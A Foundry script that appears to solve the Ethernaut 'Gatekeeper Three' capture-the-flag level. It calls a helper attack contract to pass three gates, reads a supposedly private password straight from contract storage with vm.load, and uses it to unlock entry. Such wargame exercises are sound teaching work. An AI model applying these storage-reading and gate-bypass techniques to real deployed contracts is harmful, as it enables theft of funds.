// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel28.sol";
import "../src/AttackGateThree.sol";

contract POC is Script {
    GatekeeperThree level28 =
        GatekeeperThree(payable(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9));

    SimpleTrick level28_trick =
        SimpleTrick(payable(0xD5842ce11538ddAe9BEbC1b255B4B1463ECDc531));

    AttackGateThree attackGate =
        AttackGateThree(payable(0x09e06D3e7599C8879Fa4D992C7B67279353a81BB));

    function run() external {
        vm.startBroadcast();
        //run these after deploying AttackGateThree and running:
        attackGate.passGateOne();
        //check owner of GateKeeperThree
        console.log("GATE 1: ");
        console.log("msg.sender: ", msg.sender);
        console.log("owner", level28.owner());
        console.log("tx.origin", tx.origin);

        //after passGate2 call , check values of Simple trick
        //console.log("Simpletrick Target: ", address(level28_trick.target()));
        console.log("GATE 2: ");

        // console.log("Lvl 28 Trick", address(level28.trick()));
        // console.log("Lvl 28 -> Trick -> Addr Trick: ", level28.trick().trick());
        // console.log(
        //     "lvl28 -> Trick -> Target",
        //     address(level28.trick().target())
        // );
        // console.log(
        //     "lvl28 -> Trick -> Target -> Trick",
        //     address(level28.trick().target().trick())
        // );

        // console.log("CALL INITALIAZE AGAIN");
        // level28_trick.trickInit();
        // console.log("trick -> trick address", level28_trick.trick());
        // console.log("Address(this)", address(level28_trick));

        bytes32 _pw2 = vm.load(
            level28.trick().target.address,
            bytes32(uint256(2))
        );

        //check for password
        bool result = level28.trick().checkPassword(uint256(_pw2));
        console.log("Check password result: ", result);

        // console.log("level 28 trick Address(this)", level28.trick.address);
        // console.log("Msg.sender", msg.sender);
        // console.log("level28.trick.trick.address: ", level28.trick().trick());

        attackGate.passGateTwo(uint256(_pw2));

        //level28_trick.trickyTrick();
        level28.getAllowance(uint256(_pw2));

        console.log("Allow_entarance: ", level28.allow_enterance());
        //passed gate 2 --

        //try to pass gate 3
        //send ether 0.0011 to AttackGateThree (this)
        //attempt to send ether to AttackGateThree contract

        console.log("attack result", attackGate.attack());

        vm.stopBroadcast();
    }
}
